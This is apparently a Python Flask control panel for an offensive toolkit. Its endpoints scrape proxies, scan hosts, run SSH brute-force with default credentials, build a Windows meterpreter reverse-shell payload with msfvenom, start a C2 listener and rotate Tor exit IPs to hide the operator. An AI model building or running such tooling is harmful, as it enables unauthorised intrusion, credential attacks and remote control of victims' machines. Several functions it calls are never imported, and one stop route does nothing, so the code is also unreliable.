import os
import sys

# Ensure the root directory is in the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from flask import Flask, render_template, request, redirect, session, jsonify
from database import db  # Ensure database connection works
from globals import web_config, active_tasks, proxy_stats, host_stats, brute_stats
from modules.proxy_handler import load_proxies, test_proxies, scrape_proxies
from modules.host_handler import load_hosts, test_hosts
from modules.bruteforce import bruteforce_ssh
from modules.scanner import scan_hosts
from modules.config_handler import configure_settings
from flask import Flask, jsonify
from modules.proxy_handler import (
    scrape_proxies, load_proxies, test_proxies, load_checked_proxies, save_working_proxies
)

# **Define Flask App**
app = Flask(__name__)
app.secret_key = "super_secure_secret"

# WebApp Configuration
app.config["SESSION_TYPE"] = "filesystem"
app.config["DATABASE"] = "scanner_db"

# **Fix Start WebApp Function**
def start_webapp():
    print("[INFO] Starting Flask Web Server...")
    app.run(host=web_config["host"], port=web_config["port"], debug=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/stats")
def stats():
    return jsonify({
        "proxies": proxy_stats,
        "hosts": host_stats,
        "bruteforce": brute_stats,
        "tasks": len(active_tasks)
    })   

@app.route("/proxies/scrape", methods=["POST"])
def scrape_proxies_route():
    scrape_proxies()
    return jsonify({"message": "Proxies Scraped!"}), 200

@app.route("/proxies/load", methods=["POST"])
def load_proxies_route():
    load_proxies()
    return jsonify({"message": "Proxies Loaded!"}), 200

@app.route("/proxies/test", methods=["POST"])
def test_proxies_route():
    test_proxies(load_proxies())
    return jsonify({"message": "Proxy Testing Started!"}), 200

@app.route("/proxies/save", methods=["POST"])
def save_proxies_route():
    save_working_proxies()
    return jsonify({"message": "Valid Proxies Saved!"}), 200

@app.route("/hosts/load", methods=["POST"])
def load_hosts_route():
    load_hosts()
    return jsonify({"message": "Hosts Loaded!"}), 200

@app.route("/hosts/test", methods=["POST"])
def test_hosts_route():
    test_hosts(load_hosts())
    return jsonify({"message": "Host Testing Started!"}), 200

@app.route("/hosts/scan", methods=["POST"])
def scan_hosts_route():
    scan_hosts()
    return jsonify({"message": "Host Scanning Started!"}), 200

@app.route("/bruteforce/start", methods=["POST"])
def start_bruteforce_route():
    bruteforce_ssh(load_hosts(), ["admin"], ["password"])
    return jsonify({"message": "Brute-force Started!"}), 200

@app.route("/bruteforce/stop", methods=["POST"])
def stop_bruteforce_route():
    return jsonify({"message": "Brute-force Stopped!"}), 200

@app.route("/shell/generate", methods=["POST"])
def generate_shell_route():
    generate_msfvenom_shell("windows/meterpreter/reverse_tcp", "127.0.0.1", "4444", "exe", "payload.exe")
    return jsonify({"message": "Payload Generated!"}), 200

@app.route("/c2/start", methods=["POST"])
def start_c2_route():
    start_listener()
    return jsonify({"message": "C2 Server Started!"}), 200

@app.route("/c2/stop", methods=["POST"])
def stop_c2_route():
    stop_listeners()
    return jsonify({"message": "C2 Server Stopped!"}), 200

@app.route("/tor/start", methods=["POST"])
def start_tor_route():
    start_tor()
    return jsonify({"message": "Tor Started!"}), 200

@app.route("/tor/renew", methods=["POST"])
def renew_tor_route():
    renew_tor_ip()
    return jsonify({"message": "New Tor IP Generated!"}), 200

@app.route("/tor/stop", methods=["POST"])
def stop_tor_route():
    stop_tor()
    return jsonify({"message": "Tor Stopped!"}), 200
    
if __name__ == "__main__":
    start_webapp()
